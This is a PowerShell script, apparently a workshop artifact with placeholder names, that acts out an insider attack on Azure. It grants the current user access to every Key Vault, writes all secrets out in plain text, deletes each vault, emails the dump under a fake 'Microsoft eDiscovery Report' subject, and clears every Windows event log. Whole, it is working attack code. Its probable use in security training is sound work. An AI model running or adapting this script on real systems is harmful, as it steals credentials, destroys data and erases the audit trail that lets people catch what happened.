function ExportSecrets()
{
    #execute as current user...
    $vaults = Get-AzKeyVault

    foreach($v in $vaults)
    {
        Set-AzKeyVaultAccessPolicy -ResourceGroupName $v.ResourceGroupName -VaultName $v.VaultName -UserPrincipalName '#USERNAME#' -PermissionsToSecrets set,delete,get,list

        #export all keys
        $secrets = Get-AzKeyVaultSecret -VaultName $v.VaultName;
    
        foreach($s in $secrets)
        {
            $secretText = Get-AzKeyVaultSecret -VaultName $v.VaultName -Name $s.Name -AsPlainText;
    
            $line = "$($v.VaultName)`t$($s.Name)`t$($secretText)";

            add-content "secrets.log" $line;
        }
    
        #delete it...muahahahah
        Remove-AzKeyVault -ResourceGroupName $v.ResourceGroupName -VaultName $v.VaultName -Force;
    }    
}

function Send()
{
    #send the file
    # Get the credential
    $credential = Get-Credential

    ## Define the Send-MailMessage parameters
    $mailParams = @{
        SmtpServer                 = 'smtp.office365.com'
        Port                       = '587' # or '25' if not using TLS
        UseSSL                     = $true ## or not if using non-TLS
        Credential                 = $credential
        From                       = '#USERNAME#'
        To                         = '#USERNAME#'
        Subject                    = "Microsoft eDiscovery Report - Violation"
        Body                       = 'Data Loss Protection has found outbound mail with PII information'
        DeliveryNotificationOption = 'OnFailure', 'OnSuccess'
        Attachments                = 'secrets.log'
    }

    ## Send the message
    Send-MailMessage @mailParams -Attachments $filepath1;

    #move over the logs
    MoveLogs;

    #clear event logs
    clear-all-event-logs;
}

function MoveLogs()
{
    $path = "C:\github\solliancenet\#WORKSHOP_NAME#\artifacts\day-02";

    copy-item -path "$path\logs-03\logs-05.log" "c:\logs";

    copy-item -path "$path\logs-03\logs-06.log" "c:\logs";
}

function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

param
(
    [Parameter(Mandatory)]
    [string]
    $password,

    [Parameter(Mandatory)]
    [string]
    $username
)

#$password = ConvertTo-SecureString -AsPlainText #PASSWORD# -Force;
#$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist #USERNAME#, $password;

$password = ConvertTo-SecureString -AsPlainText $password -Force;
$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password;

Connect-AzAccount -Credential $credential;

ExportSecrets;

Send;